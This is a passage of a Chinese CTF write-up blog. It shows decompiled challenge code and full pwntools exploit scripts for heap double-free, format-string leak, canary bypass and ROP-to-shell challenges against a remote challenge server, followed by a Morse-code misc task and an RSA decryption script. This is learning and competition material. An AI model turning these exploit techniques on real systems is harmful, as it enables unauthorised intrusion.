      &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">        puts(<span class="string">&quot;无效的选择...&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      Build();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>四个功能，第四个就类似于推出，主要就是创建，编辑，发布</p>
<p>每个notice是依次建立的chunk，最多建10个</p>
<p>chunk基地址是0x00000000006020C0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">notice</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> ptr[i]； <span class="comment">//就一个地址，里面存放着内容 size=0x60</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请输入公告编号:&quot;</span>);</span><br><span class="line">  v0 = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v0] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;奉天承运,Ch1p诏曰:%s\n&quot;</span>, ptr[v0]);</span><br><span class="line">    <span class="built_in">free</span>(ptr[v0]);   <span class="comment">//没有赋0，可以double free</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;404 Not Found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>别的漏洞还没有看出来</p>
<p>引用一下ctf-wiki上的话(我难得看得懂的部分)</p>
<p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<ol>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
</ol>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;./CSTW_3&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./CSTW_3&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;118.24.3.214&#x27;</span>,<span class="number">12342</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./CSTW_3&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">content</span>):</span></span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;公告内容:&#x27;</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;请输入&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;请输入&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;公告内容:&#x27;</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400B0C\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400B83\nc&#x27;)</span></span><br><span class="line">free=<span class="number">0x602045</span></span><br><span class="line">ptr=<span class="number">0x6020c0</span></span><br><span class="line">backdoor=<span class="number">0x0000000000400A04</span></span><br><span class="line">cn.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment"># build 2 chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    build(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">send(<span class="number">0</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change fd</span></span><br><span class="line">payload=p64(free)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)</span><br><span class="line">build(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    build(<span class="built_in">str</span>(i+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">build(<span class="string">&#x27;b&#x27;</span>)   </span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2058</span>-<span class="number">0x2055</span>)+p64(backdoor)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>

<p>知识点：aris带我算了一遍fatbin中chunk的范围，bin不够了要绕过范围之类的</p>
<h4 id="Steins-Gate3"><a href="#Steins-Gate3" class="headerlink" title="Steins;Gate3"></a>Steins;Gate3</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000000C78 ; __unwind &#123;</span><br><span class="line">.text:0000000000000C78                 push    rbp</span><br><span class="line">.text:0000000000000C79                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000C7C                 sub     rsp, 10h</span><br><span class="line">.text:0000000000000C80                 mov     [rbp+command], rdi</span><br><span class="line">.text:0000000000000C84                 mov     rax, [rbp+command]</span><br><span class="line">.text:0000000000000C88                 mov     rdi, rax        ; command</span><br><span class="line">.text:0000000000000C8B                 call    system</span><br><span class="line">.text:0000000000000C90                 nop</span><br><span class="line">.text:0000000000000C91                 leave</span><br><span class="line">.text:0000000000000C92                 retn</span><br></pre></td></tr></table></figure>

<p>区别就在这里，command可以我们自己靠rbp偏移去解决掉，调用我们自己想要的command</p>
<p>所以也就只有最后以快不一样，因为我们不需要完整的PIE了，泄露与rbp有关的地址在进行偏移就好调整就好</p>
<p>因为一开始想的是gate2执行了两次main，然后我也泄露出了完整的PIE，再执行一次main，把rbp泄露出来就好</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;./Gate3&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./Gate3&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;118.24.3.214&#x27;</span>,<span class="number">12343</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./Gate3&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#z(&#x27;disassemble main\n&#x27;)</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;ID:&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;world.&#x27;</span>)</span><br><span class="line">payload=(<span class="number">0x40</span>-<span class="number">0x10</span>)*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x2333</span>)</span><br><span class="line">cn.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak rand num</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;man.&#x27;</span>)</span><br><span class="line">payload2=<span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">cn.send(payload2)</span><br><span class="line">num=cn.recvuntil(<span class="string">&#x27;it?&#x27;</span>)</span><br><span class="line">rand=<span class="built_in">int</span>(num[:<span class="number">11</span>],<span class="number">16</span>)</span><br><span class="line">pie1=<span class="built_in">int</span>(num[<span class="number">15</span>:<span class="number">16</span>],<span class="number">16</span>) <span class="comment"># I find you for a long time, leak pie</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rand))</span><br><span class="line">pie1=<span class="built_in">str</span>(<span class="built_in">hex</span>(pie1))[<span class="number">2</span>:]</span><br><span class="line">pie1=binascii.unhexlify(pie1+<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pie1)</span><br><span class="line">payload3=(<span class="number">0x40</span>-<span class="number">0x24</span>)*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0x6666</span>)+(<span class="number">0x40</span>-<span class="number">0x10</span>-<span class="number">0x24</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0x1234</span>+rand)</span><br><span class="line">cn.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;Payment of past debts.&#x27;</span>)</span><br><span class="line">payload4=<span class="string">&#x27;%11$p&#x27;</span></span><br><span class="line">cn.send(payload4)</span><br><span class="line"><span class="comment">#cn.recvline()</span></span><br><span class="line">canary=cn.recvuntil(<span class="string">&quot;To seek the truth of the world.\n&quot;</span>)[:-<span class="number">0x46</span>]</span><br><span class="line">canary=<span class="built_in">int</span>(canary,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line">payload5=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p64(<span class="number">0x2333</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x08</span>+<span class="string">&#x27;\xc0&#x27;</span>+pie1</span><br><span class="line">cn.send(payload5)</span><br><span class="line"></span><br><span class="line"><span class="comment">#the second</span></span><br><span class="line"><span class="built_in">print</span>(cn.recvuntil(<span class="string">&#x27;ID:&#x27;</span>))</span><br><span class="line">cn.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;world.&#x27;</span>)</span><br><span class="line">payload6=(<span class="number">0x40</span>-<span class="number">0x10</span>)*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x2333</span>)</span><br><span class="line">cn.send(payload6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#getk rand num</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;man.&#x27;</span>)</span><br><span class="line">payload7=<span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">cn.send(payload7)</span><br><span class="line">num=cn.recvuntil(<span class="string">&#x27;it?&#x27;</span>)</span><br><span class="line">rand=<span class="built_in">int</span>(num[:<span class="number">11</span>],<span class="number">16</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(num[<span class="number">15</span>:<span class="number">16</span>],<span class="number">16</span>) <span class="comment"># I find you for a long time, leak pie</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rand))</span><br><span class="line">pie=<span class="built_in">str</span>(<span class="built_in">hex</span>(pie))[<span class="number">2</span>:]</span><br><span class="line">pie=binascii.unhexlify(pie+<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pie)</span><br><span class="line">payload7=(<span class="number">0x40</span>-<span class="number">0x24</span>)*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0x6666</span>)+(<span class="number">0x40</span>-<span class="number">0x10</span>-<span class="number">0x24</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0x1234</span>+rand)</span><br><span class="line">cn.send(payload7)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak all pie</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;Payment of past debts.&#x27;</span>)</span><br><span class="line">payload8=<span class="string">&#x27;%13$p&#x27;</span></span><br><span class="line">cn.send(payload8)</span><br><span class="line">pie=cn.recvuntil(<span class="string">&quot;To seek the truth of the world.\n&quot;</span>)[:-<span class="number">73</span>]</span><br><span class="line"><span class="comment">#print(pie)</span></span><br><span class="line">pie=<span class="built_in">int</span>(pie,<span class="number">16</span>)&lt;&lt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">rdi=pie+<span class="number">0xe83</span></span><br><span class="line">bin_sh=pie+<span class="number">0x202040</span></span><br><span class="line">command=pie+<span class="number">0xc84</span></span><br><span class="line">payload5=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p64(<span class="number">0x2333</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x08</span>+<span class="string">&#x27;\xc0&#x27;</span>+pie1</span><br><span class="line">cn.send(payload5)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;ID:&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;world.&#x27;</span>)</span><br><span class="line">payload=(<span class="number">0x40</span>-<span class="number">0x10</span>)*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x2333</span>)</span><br><span class="line">cn.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak rand num</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;man.&#x27;</span>)</span><br><span class="line">payload2=<span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">cn.send(payload2)</span><br><span class="line">num=cn.recvuntil(<span class="string">&#x27;it?&#x27;</span>)</span><br><span class="line">rand=<span class="built_in">int</span>(num[:<span class="number">11</span>],<span class="number">16</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(num[<span class="number">15</span>:<span class="number">16</span>],<span class="number">16</span>) <span class="comment"># I find you for a long time, leak pie</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rand))</span><br><span class="line">pie=<span class="built_in">str</span>(<span class="built_in">hex</span>(pie))[<span class="number">2</span>:]</span><br><span class="line">pie=binascii.unhexlify(pie+<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pie)</span><br><span class="line">payload3=(<span class="number">0x40</span>-<span class="number">0x24</span>)*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0x6666</span>)+(<span class="number">0x40</span>-<span class="number">0x10</span>-<span class="number">0x24</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0x1234</span>+rand)</span><br><span class="line">cn.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;Payment of past debts.&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&#x27;%12$p&#x27;</span></span><br><span class="line">cn.send(payload1</span><br><span class="line">rbp=<span class="built_in">int</span>(cn.recvuntil(<span class="string">&#x27;To seek the truth of the world.&#x27;</span>)[:-<span class="number">69</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line">payload2=p64(bin_sh)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p64(<span class="number">0x2333</span>)+p64(canary)+p64(rbp-<span class="number">0x68</span>)+p64(command)</span><br><span class="line">cn.sendline(payload2)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="babytcache"><a href="#babytcache" class="headerlink" title="babytcache"></a>babytcache</h4><p>这题paitial relro，no PIE，闻到了改got表的栖息，提示说可利用格式化字符串进行读写</p>
<p>同时题目还涉及到tcache这一种比较新的缓存机制，完全不会，现学</p>
<p>学习资料：<a href="https://www.360zhijia.com/anquan/371580.html">https://www.360zhijia.com/anquan/371580.html</a></p>
<p>以下介绍全部来自学习资料，就是为了自己看起来方便点</p>
<p>简单地说，它对每个线程增加一个bin缓存，这样能显著地提高性能，默认情况下，每个线程有64个bins，以16(8)递增，mensize从24(12)到1032(516)</p>
<p>每个bin是单链表结构，单个tcache bins默认最多包含7个块</p>
<p>释放时，_int_free中在检查了size合法后，放入fastbin之前，它先尝试将其放入tcache</p>
<p>在_int_malloc中，若fastbins中取出块则将对应bin中其余chunk填入tcache对应项直到填满（smallbins中也是如此）</p>
<p>在__libc_malloc，_int_malloc之前，如果tcache中存在满足申请需求大小的块，就从对应的tcache中返回chunk</p>
<p>unsorted bin 我还没接触过，先放一放，来看看题目</p>
<p>程序主要就是如下四个功能</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">      v3 = read_choice();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add(<span class="number">62LL</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下有啥漏洞</p>
<p>add函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_6020C0 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Full!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  v1 = dword_6020C0;</span><br><span class="line">  ptr[v1] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line">  myread((__int64)ptr[dword_6020C0], <span class="number">0x50</span>u);</span><br><span class="line">  ++dword_6020C0;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>能创建10个chunk，首地址在0x6020E0，每次创建的大小固定为0x60，结构体和之前的题目一样，就是一个指针，ptr[i]放内容，没什么毛病</p>
<p>delete函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v0 = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; dword_6020C0 )</span><br><span class="line">    <span class="built_in">free</span>(ptr[v0]);     <span class="comment">//double free，未赋0</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;out of range!&quot;</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; dword_6020C0 )</span><br><span class="line">    result = <span class="built_in">puts</span>(ptr[v1]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;out of range!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么问题感觉</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="听听音乐？"><a href="#听听音乐？" class="headerlink" title="听听音乐？"></a>听听音乐？</h4><p>音频里面可以听出来有摩斯密码，用Audacity打开，然后翻译摩斯密码</p>
<p><strong>1T_JU5T_4_EASY_WAV</strong></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h4><p>直接egcd，然后失败，发现公约数e与(p-1)*(q-1)的公约数4，直接e/4=3，感觉是小指数的RSA问题，失败，老老实实做</p>
<p>我自己python精度不够，gmpy2还没下下来，后来用matlab，mma算的，想办法弄个gmpy2下来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hcf</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;该函数返回两个数的最大公约数&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取最小值</span></span><br><span class="line">    <span class="keyword">if</span> x &gt; y:</span><br><span class="line">        smaller = y</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        smaller = x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, smaller + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> ((x % i == <span class="number">0</span>) <span class="keyword">and</span> (y % i == <span class="number">0</span>)):</span><br><span class="line">            hcf = i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hcf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">12</span></span><br><span class="line">p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">ciphertext = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line">key = hcf(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(key)  <span class="comment"># 4</span></span><br><span class="line"><span class="comment"># # print((p-1)*(q-1))</span></span><br><span class="line">d = modinv(e//key, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">M = <span class="built_in">pow</span>(ciphertext, d, p*q)  <span class="comment"># 2117561251816846570531080500150272</span></span><br><span class="line">M = <span class="number">20106844800109502536288854016069119595196463634259079507316147175432925273818188038332257297004492492765022431372230373366290144995921</span></span><br><span class="line">M = <span class="built_in">int</span>(<span class="built_in">pow</span>(M, <span class="number">1</span>/<span class="number">4</span>))  <span class="comment"># 精度不够</span></span><br><span class="line">M = <span class="number">2117561251816846604440536517998717</span></span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line">m = <span class="built_in">str</span>(<span 